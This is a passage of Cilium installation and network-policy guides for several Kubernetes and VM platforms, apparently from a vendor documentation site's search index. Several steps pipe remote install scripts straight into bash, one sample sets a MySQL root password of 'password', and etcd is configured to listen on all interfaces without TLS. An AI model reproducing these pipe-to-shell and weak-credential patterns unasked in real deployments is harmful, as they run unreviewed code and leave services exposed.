/usr/local/bin\n</code></pre>"},{"location":"open-source/cilium/buster/#step-4-onboard-vms-using-karmor","title":"Step 4: Onboard VMs using Karmor","text":"<pre><code>cat kvmpolicy1.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorVirtualMachine\nmetadata:\nname: testvm1\nlabels:\nname: vm1\nvm: true\n</code></pre> <p>Run this command to Add the VM:</p> <pre><code>karmor vm add kvmpolicy1.yaml\n</code></pre> <p></p> <p>To see the onboarded VM\u2019s</p> <pre><code>karmor vm list\n</code></pre> <p></p>"},{"location":"open-source/cilium/buster/#step-5-generate-installation-scripts-for-configured-worker-vms","title":"Step 5: Generate Installation scripts for configured worker VMs","text":"<p>Generate VM Installation scripts for the configured VM by running the following command:</p> <pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre> <p></p>"},{"location":"open-source/cilium/buster/#step-6-execute-the-installation-script-in-vms","title":"Step 6: Execute the Installation script in VMs","text":"<p>Install pre-requisites:</p> <ul> <li>Docker needs to install before running the script.</li> </ul> <p>Comment the following line on the script and save it:</p> <pre><code>vi testvm1.sh\n</code></pre> <pre><code>#sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS\n</code></pre> <p></p> <p>Execute the Installation script:</p> <p>Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium.</p> <p>The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies.</p> <p>Execute the script on worker VM by running the following command:</p> <pre><code>./testvm1.sh\n</code></pre> <p></p> <p>Note: Make sure the KVM-Service is running on control plane VM &amp; To Onboard more worker VM repeat Step 4, Step 5 &amp; Step 6.</p> <p>You can Verify by running following command:</p> <pre><code>sudo docker ps\n</code></pre> <p></p>"},{"location":"open-source/cilium/buster/#step-7-apply-and-verify-cilium-network-policy","title":"Step 7: Apply and Verify Cilium network policy","text":"<p>1. Allow connectivity with the control plane ( and port 2379) <pre><code>cat vm-allow-control-plane.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-control-plane\"\nspec:\ndescription: \"Policy to allow traffic to kv-store\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toCIDR:\n- 10.138.0.5/32\ntoPorts:\n- ports:\n- port: \"2379\"\nprotocol: TCP\n</code></pre> <p>2. For SSH connectivity allow port 22 and 169.254.169.254 port 80</p> <pre><code>cat vm-allow-ssh.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-ssh\"\nspec:\ndescription: \"Policy to allow SSH\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"22\"\nprotocol: TCP\n- toCIDR:\n- 169.254.169.254/32\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> <p>3. This policy block the DNS access in VM</p> <pre><code>cat vm-dns-visibility.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-dns-visibility\"\nspec:\ndescription: \"Policy to enable DNS visibility\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"53\"\nprotocol: ANY\nrules:\ndns:\n- matchPattern: \"*\"\n</code></pre> <p>4. This policy allow access of \u201cwww.google.co.in\u201d alone in VM</p> <pre><code>cat vm-allow-www-google-co-in.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-www.google.co.in\"\nspec:\ndescription: \"Policy to allow traffic to www.google.co.in\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toFQDNs:\n- matchName: www.google.co.in\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n- port: \"443\"\nprotocol: TCP\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add vm-allow-control-plane.yaml\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-ssh.yaml </code></pre> <pre><code>karmor vm --kvms policy add vm-dns-visibility.yaml </code></pre> <pre><code>karmor vm --kvms policy add vm-allow-www-google-co-in.yaml </code></pre> <p></p>"},{"location":"open-source/cilium/buster/#step-8-policy-violation-on-worker-node","title":"Step 8: Policy Violation on worker node","text":"<pre><code>curl http://www.google.co.in/\n</code></pre> <pre><code>curl https://go.dev/\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>docker exec -it cilium hubble observe -f -t policy-verdict\n</code></pre> <p></p>"},{"location":"open-source/cilium/cos/","title":"GKE with COS and Ubuntu","text":""},{"location":"open-source/cilium/cos/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on GKE with COS and Ubuntu by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/cilium/cos/#step-1-install-daemonsets-services","title":"Step 1: Install Daemonsets &amp; Services","text":"<pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash\n</code></pre> <p>Note: This will Install all the components.</p>"},{"location":"open-source/cilium/cos/#step-2-verify-the-installation","title":"Step 2: Verify the Installation","text":"<pre><code>Kubectl get pods -A\n</code></pre>"},{"location":"open-source/cilium/cos/#step-3-install-sample-k8s-application","title":"Step 3: Install sample K8's Application","text":"<pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml\n</code></pre>"},{"location":"open-source/cilium/cos/#step-4-verify-the-installation","title":"Step 4: Verify the Installation","text":"<pre><code>kubectl get pods -n wordpress-mysql\n</code></pre>"},{"location":"open-source/cilium/cos/#step-5-get-auto-discovered-policies","title":"Step 5: Get Auto discovered policies","text":"<pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash\n</code></pre>"},{"location":"open-source/cilium/cos/#step-6-applying-auto-discovered-policies-on-cluster","title":"Step 6: Applying Auto discovered policies on Cluster","text":"<p>These policies can then be applied on the k8s cluster running Cilium.</p> <p>Auto-discovery-policy service will audit the process and network and will give policies to allow only those processes and network.</p> <p>Apply Cilium policy:</p> <pre><code>kubectl apply -f cilium_policies.yaml\n</code></pre> <p>To list applied policies,</p> <p><pre><code>kubectl get ksp,cnp -A\n</code></pre> </p> <p>To uninstall all the services Installed:</p> <pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash\n</code></pre> <pre><code>kubectl delete -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml\n</code></pre>"},{"location":"open-source/cilium/eks/","title":"EKS Ubuntu Server 20.04","text":""},{"location":"open-source/cilium/eks/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on EKS Ubuntu Server 20.04 by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/cilium/eks/#step-1-create-a-eks-cluster","title":"Step 1: Create a EKS Cluster","text":"<p>Install EKS CTL, AWS CLI, Helm tools</p> <pre><code>cat eks-config.yaml </code></pre> <pre><code>apiVersion: eksctl.io/v1alpha5\nkind: ClusterConfig\nmetadata:\nname: eks-ubuntu-cluster\nregion: us-east-2\nnodeGroups:\n- name: ng-1\ninstanceType: c5a.xlarge\namiFamily: \"Ubuntu2004\"\ndesiredCapacity: 1\nvolumeSize: 80\nssh:\nallow: true\npreBootstrapCommands:\n- \"sudo apt install linux-headers-$(uname -r)\"\n</code></pre> <p>Official Link: Sample eks-config.yaml</p> <p>Note:</p> <p>EKS suported image types:  </p> <ul> <li> <p>Amazon Linux 2</p> </li> <li> <p>Ubuntu 20.04 </p> </li> <li> <p>Ubuntu 18.04</p> </li> <li> <p>Bottlerocket</p> </li> <li> <p>Windows Server 2019 Core Container </p> </li> <li> <p>Windows Server 2019 Full Container </p> </li> <li> <p>Windows Server 2004 Core Container</p> </li> <li> <p>Windows Server 20H2 Core Container</p> </li> </ul> <pre><code>eksctl create cluster -f eks-config.yaml\n</code></pre> <p></p> <pre><code>aws eks --region us-east-2 update-kubeconfig --name eks-ubuntu-cluster\n</code></pre> <p></p>"},{"location":"open-source/cilium/eks/#step-2-cilium-install","title":"Step 2: Cilium Install","text":"<pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check cilium-linux-amd64.tar.gz.sha256sum\nsudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\nrm cilium-linux-amd64.tar.gz{,.sha256sum}\ncilium install </code></pre> <p>Cilium Verify:</p> <pre><code>kubectl get pods -n kube-system | grep cilium </code></pre> <p></p> <p>Cilium Hubble Enable:</p> <pre><code>cilium hubble enable\n</code></pre> <p></p> <p>Cilium Hubble Verify:</p> <pre><code>kubectl get pods -n kube-system | grep hubble\n</code></pre> <p></p>"},{"location":"open-source/cilium/eks/#step-3-cilium-policy","title":"Step 3: Cilium Policy","text":"<p>1. Create a tightfighter and deathstart deployment</p> <pre><code>cat tightfighter-deathstart-app.yaml\n</code></pre> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\ntype: ClusterIP\nports:\n- port: 80\nselector:\norg: empire\nclass: deathstar\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\nreplicas: 2\nselector:\nmatchLabels:\norg: empire\nclass: deathstar\ntemplate:\nmetadata:\nlabels:\norg: empire\nclass: deathstar\napp.kubernetes.io/name: deathstar\nspec:\ncontainers:\n- name: deathstar\nimage: docker.io/cilium/starwars\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: tiefighter\nlabels:\norg: empire\nclass: tiefighter\napp.kubernetes.io/name: tiefighter\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: xwing\nlabels:\napp.kubernetes.io/name: xwing\norg: alliance\nclass: xwing\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n</code></pre> <pre><code>kubectl apply -f tightfighter-deathstart-app.yaml </code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Explore the policy</p> <pre><code>cat sample-cilium-ingress-policy.yaml\n</code></pre> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"rule1-ingress\"\nspec:\ndescription: \"L7 policy to restrict access to specific HTTP call\"\nendpointSelector:\nmatchLabels:\nclass: deathstar\ningress:\n- toPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\nrules:\nhttp:\n- method: \"POST\"\npath: \"/v1/request-landing\"\n</code></pre> <p></p> <p>3. Apply the policy</p> <pre><code>kubectl apply -f sample-cilium-ingress-policy.yaml </code></pre> <p></p> <p>4. Policy violation</p> <pre><code>kubectl get svc </code></pre> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.100.255.199/v1/request-landing\n</code></pre> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.100.255.199/v1/bye </code></pre> <p>5. Cilium SVC port forward to Monitor the logs</p> <pre><code>cilium hubble port-forward\n</code></pre> <p></p> <p>6. Monitoring the Cilium Violation logs</p> <pre><code>hubble observe -f --protocol http --pod tiefighter\n</code></pre> <p></p>"},{"location":"open-source/cilium/k3s/","title":"K3's Cluster","text":""},{"location":"open-source/cilium/k3s/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on K3's by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/cilium/k3s/#step-1-install-k3s-on-linux","title":"Step 1: Install K3's on Linux","text":"<pre><code>curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC='--flannel-backend=none --disable traefik' sh -s - --write-kubeconfig-mode 644\n</code></pre> <pre><code>export KUBECONFIG=/etc/rancher/k3s/k3s.yaml\n</code></pre> <pre><code>cp /etc/rancher/k3s/k3s.yaml ~/.kube/config\n</code></pre> <pre><code>systemctl status k3s\n</code></pre> <pre><code>which kubectl ; kubectl get nodes\n</code></pre>"},{"location":"open-source/cilium/k3s/#step-2-install-cilium","title":"Step 2: Install Cilium","text":"<pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check cilium-linux-amd64.tar.gz.sha256sum\n</code></pre> <pre><code>sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin ; rm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>cilium install </code></pre> <p>Cilium Verify</p> <pre><code>kubectl get pods -n kube-system | grep cilium\n</code></pre> <p></p> <p>Cilium Hubble Enable</p> <pre><code>cilium hubble enable\n</code></pre> <p></p> <p>Cilium Hubble Verify</p> <pre><code>kubectl get pods -n kube-system | grep hubble\n</code></pre> <p></p>"},{"location":"open-source/cilium/k3s/#step-3-cilium-policy","title":"Step 3: Cilium Policy","text":"<p>3.1: Create a tightfighter &amp; deathstart deployment</p> <pre><code>vim tightfighter-deathstart-app.yaml\n</code></pre> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\ntype: ClusterIP\nports:\n- port: 80\nselector:\norg: empire\nclass: deathstar\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\nreplicas: 2\nselector:\nmatchLabels:\norg: empire\nclass: deathstar\ntemplate:\nmetadata:\nlabels:\norg: empire\nclass: deathstar\napp.kubernetes.io/name: deathstar\nspec:\ncontainers:\n- name: deathstar\nimage: docker.io/cilium/starwars\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: tiefighter\nlabels:\norg: empire\nclass: tiefighter\napp.kubernetes.io/name: tiefighter\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: xwing\nlabels:\napp.kubernetes.io/name: xwing\norg: alliance\nclass: xwing\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n</code></pre> <pre><code>kubectl apply -f tightfighter-deathstart-app.yaml </code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>Apply the policy</p> <pre><code>vim sample-cilium-ingress-policy.yaml\n</code></pre> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"rule1-ingress\"\nspec:\ndescription: \"L7 policy to restrict access to specific HTTP call\"\nendpointSelector:\nmatchLabels:\nclass: deathstar\ningress:\n- toPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\nrules:\nhttp:\n- method: \"POST\"\npath: \"/v1/request-landing\"\n</code></pre> <pre><code>kubectl apply -f sample-cilium-ingress-policy.yaml   </code></pre> <pre><code>kubectl get cnp </code></pre> <p></p> <p>Violating the policy</p> <pre><code>kubectl exec -it tiefighter -- curl -XPOST deathstar.default.svc.cluster.local/v1/request-landing\n</code></pre> <pre><code>kubectl exec -it tiefighter -- curl -XPOST deathstar.default.svc.cluster.local/v1/request\n</code></pre> <p></p> <p>SVC port forward to Monitor the logs</p> <pre><code>kubectl -n kube-system port-forward svc/hubble-relay 4245:80\n</code></pre> <p></p>"},{"location":"open-source/cilium/k3s/#step-4-install-the-hubble-cli-client","title":"Step 4: Install the Hubble CLI Client","text":"<pre><code>export HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)\n</code></pre> <pre><code>curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check hubble-linux-amd64.tar.gz.sha256sum\n</code></pre> <pre><code>sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre>"},{"location":"open-source/cilium/k3s/#step-5-monitoring-the-cilium-violation-logs","title":"Step 5: Monitoring the Cilium violation logs","text":"<pre><code>hubble observe -f --protocol http --label class=deathstar\n</code></pre>"},{"location":"open-source/cilium/microk8s/","title":"MicroK8's Cluster","text":""},{"location":"open-source/cilium/microk8s/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on MicroK8's by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/cilium/microk8s/#step-1-setup-microk8s","title":"Step 1: Setup MicroK8's","text":"<p>Clone the Repository:</p> <pre><code>git clone https://github.com/kubearmor/KubeArmor.git\n</code></pre> <p></p> <pre><code>cd KubeArmor/contribution/microk8s\n</code></pre> <p>Run the script to set up MicroK8's Kubernetes:</p> <pre><code>./install_microk8s.sh\n</code></pre> <pre><code>kubectl get all -A\n</code></pre> <p></p>"},{"location":"open-source/cilium/microk8s/#step-2-cilium-install","title":"Step 2: Cilium Install","text":"<p>Install Cilium CLI:</p> <pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check cilium-linux-amd64.tar.gz.sha256sum\n</code></pre> <pre><code>sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>cilium install\n</code></pre> <p>Above tradition installation method is not working as expected, so installing using Microk8's command.</p> <pre><code>microk8s enable cilium\n</code></pre> <p></p> <p></p> <pre><code>cilium status </code></pre> <p></p> <p>Cilium Hubble Enable: </p> <pre><code>cilium hubble enable\n</code></pre> <p></p> <p>Cilium Hubble Verify: </p> <pre><code>kubectl get pods -n kube-system | grep hubble\n</code></pre> <p></p> <p>Install the Hubble CLI Client:</p> <pre><code>export HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)\n</code></pre> <pre><code>curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check hubble-linux-amd64.tar.gz.sha256sum\n</code></pre> <pre><code>sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <p></p>"},{"location":"open-source/cilium/microk8s/#step-3-cilium-policy","title":"Step 3: Cilium Policy","text":"<p>1. Create a Mysql deployment and Verify it</p> <pre><code>vi mysql.yaml\n</code></pre> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: accuknox-mysql-haproxy\nspec:\nports:\n- port: 3306\nselector:\napp: mysql\ntype: ClusterIP\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: accuknox-mysql\nspec:\nselector:\nmatchLabels:\napp: mysql\nstrategy:\ntype: Recreate\ntemplate:\nmetadata:\nlabels:\napp: mysql\nspec:\ncontainers:\n- image: mysql:8.0\nname: mysql\nresources:\nrequests:\nmemory: 100M\ncpu: 100m\n#        ephemeral-storage: 2G\nlimits:\nmemory: 1500M\ncpu: 1000m\n#        ephemeral-storage: 2G\nenv:\n# Use secret in real usage\n- name: MYSQL_ROOT_PASSWORD\nvalue: password\nports:\n- containerPort: 3306\nname: mysql\nvolumeMounts:\n- name: mysql-persistent-storage\nmountPath: /var/lib/mysql\nvolumes:\n- name: mysql-persistent-storage\npersistentVolumeClaim:\nclaimName: mysql-pv-claim\n\n---\napiVersion: v1\nkind: PersistentVolume\nmetadata:\nname: mysql-pv-volume\nlabels:\ntype: local\nspec:\nstorageClassName: standard\ncapacity:\nstorage: 2Gi\naccessModes:\n- ReadWriteOnce\nhostPath:\npath: \"/mnt/data\"\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\nname: mysql-pv-claim\nspec:\nstorageClassName: standard\naccessModes:\n- ReadWriteOnce\nresources:\nrequests:\nstorage: 2Gi\n</code></pre> <pre><code>kubectl apply -f mysql.yaml\n</code></pre> <pre><code>kubectl get pods\n</code></pre> <p></p> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Apply the following policy</p> <pre><code>vi cnp-mitre-t1571-mysql-ingress.yaml\n</code></pre> <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\nname: cnp-mitre-t1571-mysql-ingress\nnamespace: default        #change default namespace to match your namespace\nspec:\ndescription: \"Allow ingress communication only through standard ports of MySQL pods\"\nendpointSelector:\nmatchLabels:\napp: mysql              # Change label with your own labels\ningress:\n- toPorts:\n- ports:\n- port: \"3306\"\nprotocol: TCP\n- port: \"33060\"\nprotocol: TCP\n</code></pre> <p>3. Apply the policy</p> <pre><code>kubectl apply -f cnp-mitre-t1571-mysql-ingress.yaml   </code></pre> <p></p> <p>4. Violating the policy </p> <pre><code>kubectl get pod\n</code></pre> <p></p> <pre><code>kubectl exec -it &lt;mysql_pod&gt;bash\n</code></pre> <p></p> <p>5. Deleteing the policy</p> <pre><code>kubectl delete cnp rule1-ingress\n</code></pre>"},{"location":"open-source/cilium/minikube/","title":"Minikube Cluster","text":""},{"location":"open-source/cilium/minikube/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on Minikube by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/cilium/minikube/#step-1-clone-the-repository","title":"Step 1:  Clone the Repository","text":"<pre><code>git clone https://github.com/kubearmor/KubeArmor.git\n</code></pre>"},{"location":"open-source/cilium/minikube/#step-2-install-virtualbox","title":"Step 2: Install VirtualBox","text":"<pre><code>cd KubeArmor/contribution/minikube\n</code></pre> <pre><code>./install_virtualbox.sh\n</code></pre> <p>Note: Once VirtualBox installed, reboot the system.</p> <pre><code>sudo reboot\n</code></pre>"},{"location":"open-source/cilium/minikube/#step-3-install-minikube","title":"Step 3: Install Minikube","text":"<pre><code>cd KubeArmor/contribution/minikube\n</code></pre> <pre><code>./install_minikube.sh\n</code></pre> <pre><code>./start_minikube.sh\n</code></pre>"},{"location":"open-source/cilium/minikube/#step-4-cilium-installation","title":"Step 4: Cilium Installation","text":"<p>Install Cilium CLI:</p> <pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-\nlinux-amd64.tar.gz{,.sha256sum}\n</code></pre> <p></p> <pre><code>sha256sum --check cilium-linux-amd64.tar.gz.sha256sum\n</code></pre> <p></p> <pre><code>sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>cilium install\n</code></pre> <p></p> <pre><code>kubectl get pods -n kube-system | grep cilium\n</code></pre> <p></p> <pre><code>cilium status --wait\n</code></pre> <p></p> <p>Cilium Hubble Enable: </p> <pre><code>cilium hubble enable\n</code></pre> <p></p> <p>Cilium Hubble Verify:</p> <pre><code>kubectl get pods -n kube-system | grep hubble\n</code></pre> <p></p> <p>Install Hubble CLI Client:</p> <pre><code>export HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)\n</code></pre> <pre><code>curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check hubble-linux-amd64.tar.gz.sha256sum\n</code></pre> <p></p> <pre><code>sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre>"},{"location":"open-source/cilium/minikube/#step-5-getting-alertstelemetry-from-cilium","title":"Step 5: Getting Alerts/Telemetry from Cilium","text":"<p>Enable port-forwarding for Cilium Hubble relay:</p> <pre><code>cilium hubble port-forward&amp;\n</code></pre> <p></p>"},{"location":"open-source/cilium/minikube/#step-6-cilium-policy","title":"Step 6: Cilium Policy","text":"<p>1. Create a tightfighter &amp; deathstart deployment</p> <pre><code>cat tightfighter-deathstart-app.yaml\n</code></pre> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\ntype: ClusterIP\nports:\n- port: 80\nselector:\norg: empire\nclass: deathstar\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\nreplicas: 2\nselector:\nmatchLabels:\norg: empire\nclass: deathstar\ntemplate:\nmetadata:\nlabels:\norg: empire\nclass: deathstar\napp.kubernetes.io/name: deathstar\nspec:\ncontainers:\n- name: deathstar\nimage: docker.io/cilium/starwars\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: tiefighter\nlabels:\norg: empire\nclass: tiefighter\napp.kubernetes.io/name: tiefighter\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: xwing\nlabels:\napp.kubernetes.io/name: xwing\norg: alliance\nclass: xwing\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n</code></pre> <pre><code>kubectl apply -f tightfighter-deathstart-app.yaml\n</code></pre> <p></p> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Apply the following policy</p> <pre><code>cat sample-cilium-ingress-policy.yaml\n</code></pre> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"rule1-egress\"\nspec:\ndescription: \"L7 policy to restrict access to specific HTTP call\"\nendpointSelector:\nmatchLabels:\nclass: tiefighter\negress:\n- toPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\nrules:\nhttp:\n- method: \"POST\"\npath: \"/v1/request-landing\"\n</code></pre> <pre><code>kubectl apply -f sample-cilium-ingress-policy.yaml\n</code></pre> <pre><code>kubectl get CiliumNetworkPolicy\n</code></pre> <p></p> <p>3. Violating the policy</p> <pre><code>kubectl get svc\n</code></pre> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.106.29.11/v1/request-landing\n</code></pre> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.106.29.11/v1/test\n</code></pre> <p></p> <p>4. Verifying the Cilium Violation logs</p> <pre><code>hubble observe --pod tiefighter --protocol http </code></pre> <p></p>"},{"location":"open-source/cilium/suse_les_15/","title":"SUSE Linux Enterprise Server 15","text":""},{"location":"open-source/cilium/suse_les_15/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on SUSE Linux Enterprise Server 15 with 5.3 Kernel Version by applying policies on VM workloads.</p>"},{"location":"open-source/cilium/suse_les_15/#step-1-install-etcd-in-control-plane-vm","title":"Step 1: Install etcd in control plane VM","text":"<p>Create etcd user:</p> <pre><code>groupadd --system etcd\n</code></pre> <p><pre><code>useradd --home-dir \"/var/lib/etcd\" \\\n--system \\\n--shell /bin/false \\\n-g etcd \\\netcd\n</code></pre> Create the necessary directories:</p> <pre><code>mkdir -p /etc/etcd\n</code></pre> <pre><code>chown etcd:etcd /etc/etcd\n</code></pre> <pre><code>mkdir -p /var/lib/etcd\n</code></pre> <pre><code>chown etcd:etcd /var/lib/etcd\n</code></pre> <p>Determine your system architecture:</p> <pre><code>uname -m\n</code></pre> <p></p> <p>Download and Install the etcd tarball for x86_64/amd64:</p> <pre><code>ETCD_VER=v3.2.7\n</code></pre> <pre><code>rm -rf /tmp/etcd &amp;&amp; mkdir -p /tmp/etcd\n</code></pre> <pre><code>curl -L \\     https://github.com/coreos/etcd/releases/download/${ETCD_VER}/etcd-${ETCD_VER}-linux-amd64.tar.gz \\\n-o /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\n</code></pre> <pre><code>tar xzvf /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz \\\n-C /tmp/etcd --strip-components=1\n</code></pre> <pre><code>cp /tmp/etcd/etcd /usr/bin/etcd\n</code></pre> <pre><code>cp /tmp/etcd/etcdctl /usr/bin/etcdctl\n</code></pre> <p>Or Download and Install the etcd tarball for arm64:</p> <pre><code>ETCD_VER=v3.2.7\n</code></pre> <pre><code>rm -rf /tmp/etcd &amp;&amp; mkdir -p /tmp/etcd\n</code></pre> <pre><code>curl -L \\  https://github.com/coreos/etcd/releases/download/${ETCD_VER}/etcd-${ETCD_VER}-linux-arm64.tar.gz \\\n-o /tmp/etcd-${ETCD_VER}-linux-arm64.tar.gz\n</code></pre> <pre><code>tar xzvf /tmp/etcd-${ETCD_VER}-linux-arm64.tar.gz \\\n-C /tmp/etcd --strip-components=1\n</code></pre> <pre><code>cp /tmp/etcd/etcd /usr/bin/etcd\n</code></pre> <pre><code>cp /tmp/etcd/etcdctl /usr/bin/etcdctl\n</code></pre> <p>Create and Edit the .yaml file:</p> <pre><code>sudo vi /etc/etcd/etcd.conf.yaml\n</code></pre> <pre><code>name: controller\ndata-dir: /var/lib/etcd\ninitial-cluster-state: 'new'\ninitial-cluster-token: 'etcd-cluster-01'\ninitial-cluster: controller=http://0.0.0.0:2380\ninitial-advertise-peer-urls: http://0.0.0.0:2380\nadvertise-client-urls: http://0.0.0.0:2379\nlisten-peer-urls: http://0.0.0.0:2380\nlisten-client-urls: http://0.0.0.0:2379\n</code></pre> <p>Create and Edit the .service file:</p> <pre><code>sudo vi /usr/lib/systemd/system/etcd.service\n</code></pre> <pre><code>[Unit]\nAfter=network.target\nDescription=etcd - highly-available key value store\n\n[Service]\n# Uncomment this on ARM64.\n# 